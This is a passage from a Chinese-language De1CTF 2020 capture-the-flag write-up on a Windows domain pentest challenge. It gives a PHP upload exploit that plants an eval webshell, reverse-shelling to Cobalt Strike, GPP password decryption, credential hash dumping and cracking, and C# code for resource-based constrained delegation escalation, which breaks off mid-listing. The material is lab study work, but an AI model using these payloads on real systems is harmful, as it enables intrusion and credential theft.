class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx--"""</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_=[]?&gt;&lt;?=$_=@"$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$___=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$________=$_?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$________='_'?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$_________=$__.$___.$__.$____.$_____.$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__________=$________.$_______.$_____.$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________=$$__________?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________[_]($____________________[__],$____________________[___])?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">data=data.format(<span class="string">"syc.pHp"</span>,payload)</span><br><span class="line"></span><br><span class="line">r=requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">filename=re.search(<span class="string">"in:(uploads/.*)"</span>,r.text).group(<span class="number">1</span>)</span><br><span class="line">filename=filename.strip()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"http://47.113.219.76/"</span>+filename)</span><br><span class="line">r=requests.get(<span class="string">"http://47.113.219.76/"</span>+filename+<span class="string">"?_=file_put_contents&amp;__=1.php&amp;___=&lt;?php eval($_POST[a]);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>打完访问对应目录是下的1.php，密码是a。</p><p>连上webshell后把shell反弹到cs上，使用powerview进行信息收集可以看到，域内共享有一个hint。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/wintool/PowerView<span class="literal">-dev</span>.ps1</span><br><span class="line">powershell <span class="built_in">get-domaincomputer</span>|<span class="built_in">get-netshare</span></span><br></pre></td></tr></table></figure><p><img src="1588571307111-5e34ec2e-3746-4588-a39a-10f3a9f63a25.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&name=image.png&originHeight=740&originWidth=1972&size=170863&status=done&style=none&width=986" alt="image.png"><br>查看这个Hint可以发现，有一个拿flag的tip。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.De1CTF2020.lab\Hin</span><br></pre></td></tr></table></figure><p><img src="1588571461665-c690928a-3e23-45b0-a976-6085f19c8b8c.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=516&originWidth=1310&size=89949&status=done&style=none&width=746" alt="image.png"><br>把提示拷贝下来下载发现这个zip需要密码才能打开。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy \\dc.De1CTF2020.lab\Hint\flag1_and_flag2hint.zip .</span><br></pre></td></tr></table></figure><p><img src="1588571579651-4a3a8b66-d1f2-45fd-a1f5-0f3ece8c3806.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=1394&size=41584&status=done&style=none&width=746" alt="image.png"><br><img src="1588571632020-37b1afd9-feb0-418c-ad5d-1c4498fd8e69.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=228&originWidth=734&size=162224&status=done&style=none&width=746" alt="image.png"></p><p>接着收集，域内用户信息发现有一个可疑用户。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /dom</span><br></pre></td></tr></table></figure><p><img src="1588571706287-81a8ed6d-3616-4d15-8bf5-71f73ddd2ab0.png#align=left&display=inline&height=278&margin=%5Bobject%20Object%5D&name=image.png&originHeight=512&originWidth=1372&size=69925&status=done&style=none&width=746" alt="image.png"><br>猜测HintZip_Pass账户密码就是解压缩的密码。这里经过一些尝试之后考虑会不会是gpp尝试ps直接导出，发现爆了个错，看意思是说当前用户不是domain user（客观事实是当前账户就是域用户）。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/<span class="built_in">Get-GPPPassword</span>.ps1</span><br><span class="line">powershell <span class="built_in">Get-GPPPassword</span></span><br></pre></td></tr></table></figure><p><img src="1588572573067-016fb792-b6b8-4668-bcf1-867cd7c903d6.png#align=left&display=inline&height=264&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=3320&size=219484&status=done&style=none&width=1660" alt="image.png"><br>也不会改powershell，就直接手动遍历SYSVOL了（还好不是很多，多的话建议弹到msf上用msf的脚本搞）<br><img src="1588572660278-a2470a51-0660-40e9-84db-f27631fd0de1.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=3098&size=139547&status=done&style=none&width=1549" alt="image.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;Groups clsid=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;&lt;User clsid=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> name=<span class="string">"HintZip_Pass"</span> image=<span class="string">"2"</span> changed=<span class="string">"2020-04-15 14:43:23"</span> uid=<span class="string">"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;"</span>&gt;&lt;Properties action=<span class="string">"U"</span> newName=<span class="string">""</span> fullName=<span class="string">""</span> description=<span class="string">""</span> cpassword=<span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span> changeLogon=<span class="string">"1"</span> noChange=<span class="string">"0"</span> neverExpires=<span class="string">"0"</span> acctDisabled=<span class="string">"0"</span> userName=<span class="string">"HintZip_Pass"</span>/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp<span class="literal">-decrypt</span> uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+<span class="number">08</span></span><br></pre></td></tr></table></figure><p><img src="1588572802371-89b2b0bb-448d-4a90-bf15-98e33fc1aeb7.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=1560&size=30614&status=done&style=none&width=780" alt="image.png"><br>用zL1PpP@sSwO3d解密刚才的压缩包flag1_and_flag2hint.zip即可得到，第一个flag和下一关的提示。<br><img src="1588573070964-1b84f5a1-acb3-4953-9c2d-73178a7d1f04.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=image.png&originHeight=424&originWidth=1910&size=215139&status=done&style=none&width=955" alt="image.png"></p><h2 id="pentest2"><a href="#pentest2" class="headerlink" title="pentest2"></a>pentest2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&#39;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure><p>从提示可以看出来，出题的思路是，通过某种离线爆破的方法拿到De1ta密码，De1ta用户存在acl滥用问题以至于可以搞到域控拿下读到C:\Users\Administrator\Desktop\flag.txt。</p><p>关于如何离线爆破我这里是非预期，之前服务器web账号有特权可以juicypotato提权。<br><img src="1588573565560-9d6716f9-d32b-4eb5-9a9c-91711b04a197.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&name=image.png&originHeight=340&originWidth=1518&size=164466&status=done&style=none&width=759" alt="image.png"><br>我一直没成功。<br><img src="1588573783800-0db2592f-a2cd-4c5f-9cdd-4ca11d0cf248.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=286&originWidth=2938&size=333395&status=done&style=none&width=1469" alt="image.png"><br>当时有其他师傅成功，给我弹了个system shell。<br><img src="1588573859200-550561f7-5f5a-4a84-a1fa-e13ccac3ada6.png#align=left&display=inline&height=850&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1700&originWidth=2336&size=1034458&status=done&style=none&width=1168" alt="image.png"><br>导出De1ta账户的mscach</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">python secretsdump.py -security &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;hash&#x2F;security.hive -system &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;hash&#x2F;SYSTEM.hive LOCAL</span><br></pre></td></tr></table></figure><p><img src="1588574718180-d11b9ed0-667b-4ae6-99e4-e01193c87746.png#align=left&display=inline&height=475&margin=%5Bobject%20Object%5D&name=image.png&originHeight=950&originWidth=1648&size=236880&status=done&style=none&width=824" alt="image.png"><br>可以拿到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DE1CTF2020.LAB&#x2F;De1ta:$DCC2$10240#De1ta#52c2cfff23d879a2ba830cf184c10b46</span><br></pre></td></tr></table></figure><p>根据提示的密码复杂度，用hascat跑出来结果是3f23ea12。</p><p>密码有了下一步根据提示来Delta acl滥用问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;wintool&#x2F;PowerView-master.ps1</span><br><span class="line">powershell Get-ObjectAcl -Domain De1CTF2020.lab -ResolveGUIDs|?&#123;$_.IdentityReference -eq &quot;DE1CTF2020\De1ta&quot;&#125;</span><br></pre></td></tr></table></figure><p>输出出来了很多东西重点关注两个地方，第一个地方是De1ta的ExtendedRight让他具备Dcshadow的攻击的能力。<br><img src="1588575673500-53352e9a-aeb4-4e14-9ad0-b26a863c9020.png#align=left&display=inline&height=677&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1354&originWidth=1986&size=264009&status=done&style=none&width=993" alt="image.png"></p><p><img src="1588575717063-9f145c16-c35c-42f5-a0e6-e5324a265a61.png#align=left&display=inline&height=780&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=2814&size=306391&status=done&style=none&width=1407" alt="image.png"></p><p>通过查阅资料可以知道Dcshadow攻击时需要De1ta这种特权账号和一个SYSTEM账号。做到这里的时候juciypotato已经修了，之前抓的administrator hash也改了。（<strong>经验不丰富，如果之前抓了机器hash也能提权了</strong>）。</p><p>接下来就需要关注第二个地方了。De1ta用户对DM机器具有WriteProperty，环境又是12，所以可以用烂番茄提权。<br><img src="1588581133347-61181c79-d803-4958-8961-9ffbcfcbd06d.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=1468&size=81567&status=done&style=none&width=734" alt="image.png"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Security.AccessControl;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Addnew_MachineAccount</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            String DomainController = <span class="string">"192.168.0.12"</span>;</span><br><span class="line">            String Domain = <span class="string">"De1CTF2020.lab"</span>;</span><br><span class="line">            String new_MachineAccount = <span class="string">"lisan4"</span>; <span class="comment">//添加的机器账户</span></span><br><span class="line">            String new_MachineAccount_password = <span class="string">"sycl0ver"</span>; <span class="comment">//机器账户密码</span></span><br><span class="line">            String victimcomputer = <span class="string">"DM"</span>; <span class="comment">//需要进行提权的机器</span></span><br><span class="line">            String victimcomputer_ldap_path = <span class="string">"LDAP://CN=DM,CN=Computers,DC=De1CTF2020,DC=lab"</span>;</span><br><span class="line">            String machine_account = new_MachineAccount;</span><br><span class="line">            String sam_account = machine_account + <span class="string">"$"</span>;</span><br><span class="line"></span><br><span class="line">            String distinguished_name = <span class="string">""</span>;</span><br><span class="line">            String[] DC_array = <span class="literal">null</span>;</span><br><span class="line">            distinguished_name = <span class="string">"CN="</span> + machine_account + <span class="string">",CN=Computers"</span>;</span><br><span class="line">            DC_array = Domain.Split(<span class="string">'.'</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (String DC <span class="keyword">in</span> DC_array)</span><br><span class="line">            &#123;</span><br><span class="line">                distinguished_name += <span class="string">",DC="</span> + DC;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Elevate permissions on "</span> + victimcomputer);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain = "</span> + Domain);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain Controller = "</span> + DomainController);</span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] New SAMAccountName = " + sam_account);</span></span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] Distinguished Name = " + distinguished_name);</span></span><br><span class="line">            <span class="comment">//连接ldap</span></span><br><span class="line">            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, <span class="number">389</span>);</span><br><span class="line">            <span class="comment">//NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录            </span></span><br><span class="line"></span><br><span class="line">            System.DirectoryServices.Protocols.LdapConnection connection = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);</span></span><br><span class="line">            connection = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapConnection(identifier);</span><br><span class="line">            connection.SessionOptions.Sealing = <span class="literal">true</span>;</span><br><span class="line">            connection.SessionOptions.Signing = <span class="literal">true</span>;</span><br><span class="line">            connection.Bind();</span><br><span class="line">            <span class="keyword">var</span> request = <span class="keyword">new</span> System.DirectoryServices.Protocols.AddRequest(distinguished_name, <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute[] &#123;</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"DnsHostName"</span>, machine_account +<span class="string">"."</span>+ Domain),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"SamAccountName"</span>, sam_account),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"userAccountControl"</span>, <span class="string">"4096"</span>),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"unicodePwd"</span>, Encoding.Unicode.GetBytes(<span class="string">"\""</span> + new_MachineAccount_password + <span class="string">"\""</span>)),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"objectClass"</span>, <span class="string">"Computer"</span>),</span><br><span class="line">               <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"ServicePrincipalName"</span>, <span class="string">"HOST/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"RestrictedKrbHost/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"HOST/"</span>+machine_account,<span class="string">"RestrictedKrbHost/"</span>+machine_account)</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//添加机器账户</span></span><br><span class="line">                connection.SendRequest(request);</span><br><span class="line">                Console.WriteLine(<span class="string">"[+] Machine account: "</span> + machine_account + <span class="string">" Password: "</span> + new_MachineAccount_password + <span class="string">" added"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)"</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] Exception: "</span> + ex.Message);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 获取新计算机对象的SID</span></span><br><span class="line">            <span class="keyword">var</span> new_request = <span class="keyword">new</span> System.DirectoryServices.Protocols.SearchRequest(distinguished_name, <span class="string">"(&amp;(samAccountType=805306369)(|(name="</span> + machine_account + <span class="string">")))"</span>, System.DirectoryServices.Protocols.SearchScope.Subtree, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">var</span> new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);</span><br><span class="line">            SecurityIdentifier sid = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (System.DirectoryServices.Protocols.SearchResultEntry entry <span class="keyword">in</span> new_response.Entries)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    sid = <span class="keyword">new</span> SecurityIdentifier(entry.Attributes[<span class="string">"objectsid"</span>][<span class="number">0</span>] <span class="keyword">as</span> <span class="keyword">byte</span>[], <span class="number">0</span>);</span><br><span class="line">                    Console.Out.WriteLine(<span class="string">"[+] "</span> + new_MachineAccount + <span class="string">" SID : "</span> + sid.Value);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] It was not possible to retrieve the SID.\nExiting..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置资源约束委派</span></span><br><span class="line">            System.DirectoryServices.DirectoryEntry myldapConnection = <span class="keyword">new</span> System.DirectoryServices.DirectoryEntry(<span class="string">"De1CTF2020.lab"</span>,<span class="string">"De1ta"</span>, <span class="string">"3f23ea12"</span>);</span><br><span class="line"></span><br><span class="line">            myldapConnection.Path = victimcomputer_ldap_path;</span><br><span class="line"></span><br><span class="line">            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;</span><br><span class="line">            System.DirectoryServices.DirectorySearcher search = <span class="keyword">new</span> System.DirectoryServices.DirectorySearcher(myldapConnection);</span><br><span class="line">            <span class="comment">//通过ldap找计算机</span></span><br><span class="line">            search.Filter = <span class="string">"(CN="</span> + victimcomputer + <span class="string">")"</span>;</span><br><span class="line">            <span class="keyword">string</span>[] requiredProperties = <span class="keyword">new</span> <span class="keyword">string</span>[] &#123; <span class="string">"samaccountname"</span> &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (String property <span class="keyword">in</span> requiredProperties)</span><br><span class="line">                search.PropertiesToLoad.Add(property);</span><br><span class="line">            System.DirectoryServices.SearchResult result = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                result = 